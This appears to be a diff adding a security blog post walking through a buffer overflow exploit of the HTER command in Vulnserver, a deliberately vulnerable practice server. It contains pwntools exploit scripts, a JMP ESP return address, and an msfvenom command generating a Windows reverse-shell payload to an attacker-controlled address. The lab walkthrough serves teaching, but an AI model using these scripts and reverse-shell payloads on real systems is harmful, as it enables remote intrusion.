@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible" />
+<meta content="text/html; charset=UTF-8" http-equiv="content-type" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+<meta name="robots" content="index, follow">
+
+
+
+
+
+
+
+
+
+
+<title>Vulnserver: Buffer overflow in HTER command with a small obstacle</title>
+
+
+
+<meta name="title" content="Vulnserver: Buffer overflow in HTER command with a small obstacle">
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://guas.ch/blog/vulnserver3-hter/">
+
+<meta property="og:site_name" content="">
+
+
+<meta property="og:title" content="Vulnserver: Buffer overflow in HTER command with a small obstacle">
+
+
+
+
+
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="https://guas.ch/blog/vulnserver3-hter/">
+
+<meta property="twitter:title" content="Vulnserver: Buffer overflow in HTER command with a small obstacle">
+
+
+
+
+<link rel="canonical" href="https://guas.ch/blog/vulnserver3-hter/">
+
+
+
+
+<link rel="alternate" type="application/atom+xml" title="RSS" href="https://guas.ch/atom.xml"> 
+
+
+
+<link rel="stylesheet" href="https://guas.ch/css/style.css" />
+
+<script defer>
+    const setTheme = (theme) => {
+        document.documentElement.className = theme;
+        localStorage.setItem('theme', theme);
+    }
+
+    const hasCodeRun = localStorage.getItem('hasCodeRun');
+
+    if (!hasCodeRun) {
+        const defaultTheme = "light";
+        setTheme(defaultTheme);
+        localStorage.setItem('hasCodeRun', 'true');
+    }
+
+    const getTheme = () => {
+        const theme = localStorage.getItem('theme');
+        if (theme) {
+            setTheme(theme);
+        }
+    }
+
+    getTheme();
+
+</script>
+</head>
+<body>
+    <div class="wrapper">
+      <header>
+          
+
+  
+
+
+  <nav class="navBar">
+    
+      <a href="&#x2F;" class="">
+        
+        &#x2F;whoami&#x2F;
+      </a>
+    
+      <a href="&#x2F;blog" class="">
+        
+        &#x2F;blog&#x2F;
+      </a>
+    
+
+  <div class="themeSwitch">
+    
+    <button class="themeButton light" onclick="setTheme('light')" title="Light mode"><svg class="icons icons__background"> <use href="https://guas.ch/icons.svg#lightMode"></use></svg></button>
+    <button class="themeButton dark" onclick="setTheme('dark')" title="Dark mode"><svg class="icons icons__background"><use href="https://guas.ch/icons.svg#darkMode"></use></svg></button>
+
+    
+  </div>
+</nav>
+
+
+      </header>
+      <main>
+          
+<div><a href="..">..</a>/<span class="metaData">vulnserver3-hter</span></div>
+<time datetime="2019-09-09">Published on: <span class="metaData">2019-09-09</span></time>
+
+<h1>Vulnserver: Buffer overflow in HTER command with a small obstacle</h1>
+
+
+
+<p>We are back from a vacation and it's time to keep going with the Vulnserver series of posts. In this post we are going to exploit the crash found in the HTER command of Vulnserver. And important note to make before starting is that this post is going to be shorter than the previous one since I'm going to skip the steps that we have already seen.<!--more--></p>
+<h2 id="analyzing-the-crash">Analyzing the crash</h2>
+<p>In this case the registers in Immunity Debugger looked like in the image below after the crash.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg1.PNG">
+    <img src="img&#x2F;immunitydbg1.PNG" >
+  </a>
+  
+</div><div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg2.PNG">
+    <img src="img&#x2F;immunitydbg2.PNG" >
+  </a>
+  
+</div>
+<p>We can see that we have overwrote EIP and produced a crash, but there's something peculiar about the value in EIP. The command that caused the crash was the following:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">HTER</span><span> AAAAAAAAAAAAAAAAAAA... </span><span style="color:#65737e;"># There&#39;s supposed to be 5000 As here
+</span></code></pre>
+<p>So with that command we expect EIP to be equal to 41414141 but instead it's AAAAAAAA so that makes us think that the target is interpreting our input as hex. This means that from now own we should feed the string representation of the hex values we want to use.</p>
+<p>So instead of generating a De Brujin pattern like we normally do, we modify the alphabet used to respect the constraints.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">$</span><span> cyclic</span><span style="color:#bf616a;"> -a </span><span>&quot;</span><span style="color:#a3be8c;">123456789ABCDEF</span><span>&quot; 5000
+</span></code></pre>
+<p>After the crash we can simply check the offset using the command again but we have to take into account the endianness and that we are using the string representation of the hex values so with the following crash:</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg3.PNG">
+    <img src="img&#x2F;immunitydbg3.PNG" >
+  </a>
+  
+</div>
+<p>We see that it crashed at EIP 0xC137B137, if we reverse the endianness we obtain 0x37B137C1 and since we are looking at the string representation we should search for the first for character &quot;37B1&quot;.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">$</span><span> cyclic</span><span style="color:#bf616a;"> -a </span><span>&quot;</span><span style="color:#a3be8c;">123456789ABCDEF</span><span>&quot;</span><span style="color:#bf616a;"> -l </span><span>&quot;</span><span style="color:#a3be8c;">37B1</span><span>&quot;
+</span><span style="color:#bf616a;">2046
+</span></code></pre>
+<p>So we obtained our EIP offset that we can check with a python script like the following:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># IP and port of the target (Vulnserver).
+</span><span>ip = &quot;</span><span style="color:#a3be8c;">192.168.1.128</span><span>&quot;
+</span><span>port = </span><span style="color:#d08770;">9999
+</span><span>
+</span><span>cmd= &quot;</span><span style="color:#a3be8c;">HTER </span><span>&quot;
+</span><span>offset_eip = </span><span style="color:#d08770;">2046
+</span><span style="color:#65737e;"># Note that we have to take into account the endianness in EIP too.
+</span><span>eip = &quot;</span><span style="color:#a3be8c;">BEBAFECA</span><span>&quot; </span><span style="color:#65737e;"># EIP = 0xCAFEBABE
+</span><span>
+</span><span style="color:#65737e;"># Create our payload.
+</span><span>payload = </span><span style="color:#bf616a;">fit</span><span>({
+</span><span>    </span><span style="color:#d08770;">0</span><span>:cmd,
+</span><span>    offset_eip:eip,
+</span><span>    },</span><span style="color:#bf616a;">length</span><span>=</span><span style="color:#d08770;">5000</span><span>,</span><span style="color:#bf616a;">filler</span><span>=</span><span style="color:#bf616a;">de_bruijn</span><span>(</span><span style="color:#bf616a;">alphabet</span><span>=&quot;</span><span style="color:#a3be8c;">123456789ABCDEF</span><span>&quot;))
+</span><span>
+</span><span>io = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span></code></pre>
+<p>And it's confirmed in Immunity Debugger:</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg4.PNG">
+    <img src="img&#x2F;immunitydbg4.PNG" >
+  </a>
+  
+</div><h2 id="exploiting">Exploiting</h2>
+<p>After all of that exploitation is pretty straight forward. First of all, we find an address that has the command JMP ESP to execute our shellcode in the stack. For that we just use the command jmp available in the Mona plugin for Immunity Debugger.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg5.PNG">
+    <img src="img&#x2F;immunitydbg5.PNG" >
+  </a>
+  
+</div>
+<p>We can use the first address shown 0x625011af which is part of essfunc.dll and has ASLR disabled.</p>
+<p>After that we simple need some shellcode which we can generate with msfvenom.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">$</span><span> msfvenom</span><span style="color:#bf616a;"> -p</span><span> windows/shell_reverse_tcp LHOST=192.168.1.139 LPORT=443 EXITFUNC=thread</span><span style="color:#bf616a;"> -f</span><span> hex</span><span style="color:#bf616a;"> -b </span><span>&quot;</span><span style="color:#a3be8c;">\x00\x0a</span><span>&quot;
+</span></code></pre>
+<p>Remember that we have to use the string representation so that's why we choose the hex format here.</p>
+<p>Now all that's left is to put everything together in our exploit.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># IP and port of the target (Vulnserver).
+</span><span>ip = &quot;</span><span style="color:#a3be8c;">192.168.1.128</span><span>&quot;
+</span><span>port = </span><span style="color:#d08770;">9999
+</span><span>
+</span><span>cmd= &quot;</span><span style="color:#a3be8c;">HTER </span><span>&quot;
+</span><span>offset_eip = </span><span style="color:#d08770;">2046
+</span><span style="color:#65737e;"># Note that we have to take into account the endianness in EIP too.
+</span><span>eip = &quot;</span><span style="color:#a3be8c;">AF115062</span><span>&quot; </span><span style="color:#65737e;"># Address of instruction we want to run (Ex. jmp esp).
+</span><span>
+</span><span style="color:#65737e;"># Here we put the shellcode we want to execute.
+</span><span>offset_sc = offset_eip + </span><span style="color:#d08770;">8
+</span><span>shellcode = &quot;</span><span style="color:#a3be8c;">90</span><span>&quot;*</span><span style="color:#d08770;">16
+</span><span>shellcode += &quot;</span><span style="color:#a3be8c;">dac0d9742...</span><span>&quot; </span><span style="color:#65737e;"># Cut for brevity.
+</span><span>
+</span><span style="color:#65737e;"># Create our payload.
+</span><span>payload = </span><span style="color:#bf616a;">fit</span><span>({
+</span><span>    </span><span style="color:#d08770;">0</span><span>:cmd,
+</span><span>    offset_eip:eip,
+</span><span>    offset_sc:shellcode
+</span><span>    },</span><span style="color:#bf616a;">length</span><span>=</span><span style="color:#d08770;">5000</span><span>,</span><span style="color:#bf616a;">filler</span><span>=</span><span style="color:#bf616a;">de_bruijn</span><span>(</span><span style="color:#bf616a;">alphabet</span><span>=&quot;</span><span style="color:#a3be8c;">123456789ABCDEF</span><span>&quot;))
+</span><span>
+</span><span>io = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span></code></pre>
+<p>And that's it, a buffer overflow very similar to the previous one that adds some constraints which allowed us to learn a few tricks.</p>
+<p>See you guys in the next post.</p>
+
+
+<p class="tagsData">
+  
+</p>
+
+      </main>
+      <footer>
+          <hr>
+<div class=footContainer>
+  <div class="footLeft">
+      Built with <a target="_blank" rel="noopener noreferrer" href="https://www.getzola.org">Zola</a> using <a target="_blank" rel="noopener noreferrer" href="https://github.com/Speyll/anemone">anemone</a> theme &amp; <a target="_blank" rel="noopener noreferrer" href="https://github.com/Speyll/veqev">veqev</a> colors.<br>
+    </p>
+  </div>
+  
+  <div class="footRight">
+    <a class="icons__background" target="_blank" rel="noopener noreferrer" href="https://guas.ch/atom.xml" title="Subscribe via RSS for updates."><svg class="icons icons__background"><use href="https://guas.ch/icons.svg#rss"></use></svg></a>
+  </div>
+  
+</div>
+      </footer>
+    </div>
+</body>
+</html>
